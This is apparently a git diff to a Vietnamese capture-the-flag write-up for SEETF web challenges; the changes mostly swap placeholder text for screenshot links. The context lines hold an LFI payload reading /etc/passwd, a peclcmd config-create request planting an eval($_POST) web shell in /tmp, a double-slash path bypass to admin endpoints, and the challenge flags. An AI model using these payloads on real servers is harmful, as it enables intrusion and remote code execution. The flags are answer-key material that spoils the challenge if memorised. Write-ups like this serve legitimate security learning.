@@ -10,7 +10,7 @@ Write up nhằm ép mình hiểu bản vấn đề và giải thích + repoduce 
 
 ## Sourceless Guessy Web (Baby Flag)
 
-1 - main page
+![Screenshot (897)](https://user-images.githubusercontent.com/71699412/172428070-83826197-6374-4f8f-8bbe-d5c90667ab54.png)
 
 LFI cổ điển, payload:
 ```
@@ -20,7 +20,7 @@ http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd
 
 ## Sourceless Guessy Web (RCE Flag)
 
-2 - php.ini
+![Screenshot (898)](https://user-images.githubusercontent.com/71699412/172428094-6f83dd36-d541-45f8-b2a6-6578f4aa53f7.png)
 
 Đến bài này ta cần RCE để lấy được flag, ở main page nó có cho đọc 1 trang `phpinfo()` và show luôn ra rằng: `register_argc_argv:	On`
 
@@ -42,13 +42,15 @@ Phân tích lỗi sâu hơn: https://chowdera.com/2022/01/202201071654034352.htm
 
 **EXPLOIT**:
 
-ảnh 1:
+![Screenshot (899)](https://user-images.githubusercontent.com/71699412/172428144-a2c39568-b63f-4ea8-9041-2ccf4e31121c.png)
+
 ```
 ?page=../../../usr/local/lib/php/peclcmd.php&+config-create+/RESULT/<?=eval($_POST[1]);?>/RESULT/*+/tmp/devme.php
 ```
 Lưu ý tránh các kí tự đặc biệt như `'`, `"` hay dấu `space` để tránh bị urlencode từ đó payload không chạy được. Vì thế ta dùng tạm hàm `eval()` rồi mới nạp `system()` vào để RCE.
 
-ảnh 2:
+![Screenshot (900)](https://user-images.githubusercontent.com/71699412/172428186-6f186f37-c00b-416a-9207-ac50b63f4266.png)
+
 ```
 ?page=../../../tmp/devme.php
 ```
@@ -264,7 +266,10 @@ http://flagportal//admin == http://flagportal/admin
 
 Nên ta dễ dàng bypass
 
-ảnh 1
+![Screenshot (901)](https://user-images.githubusercontent.com/71699412/172428358-701501cf-e294-48d5-ba8a-c2272f57572a.png)
+
+**response**:
+![Screenshot (902)](https://user-images.githubusercontent.com/71699412/172428383-36aa7d88-fd6a-46a2-8f21-e6ab952721e4.png)
 
 **flag**: `
 SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}`
@@ -275,9 +280,11 @@ Ngoài ra nó gửi thêm header `admin-key` cho `Flag Portal (Flag 2)`
 
 1. Bài này tiếp nối `Flag Portal (Flag 1)`, nay ta chỉ cần POST đến thẳng endpoint `/api//flag-plz`(Do `/api` sẽ map đến `http://backend/` nên `/api//flag-plz` đến `http://api//flag-plz`). Từ đây ta bypass được `target` bị gán chặt với link rút gọn rick roll nếu request từ `/admin`, đây có lẽ cũng unintended.
 
-ảnh 2
+![Screenshot (904)](https://user-images.githubusercontent.com/71699412/172428770-3fd785c7-805b-4d22-9b24-59c299cb3a1c.png)
 
 Ta cho thêm header `admin-key` + `Content-Type: application/x-www-form-urlencoded` header(không có - không nhận url)
+
+![Screenshot (905)](https://user-images.githubusercontent.com/71699412/172428807-0e0e8ef9-eb54-4902-80ab-689619d8993c.png)
 
 **flag**: `SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}`
 
@@ -396,7 +403,7 @@ for i in range(1, 6):
 	os.system(f'convert result/half/done*.jpg +append result/half/finished.jpg') 
 ```
 
-ảnh 
+![flag](https://user-images.githubusercontent.com/71699412/172428844-6ab27086-6b1d-490f-9e2d-5aa65aedb624.jpg)
 
 **flag**: `SEE{boss_aint_too_happy_bout_me_9379c958d872435}`
 ## "as" "df"
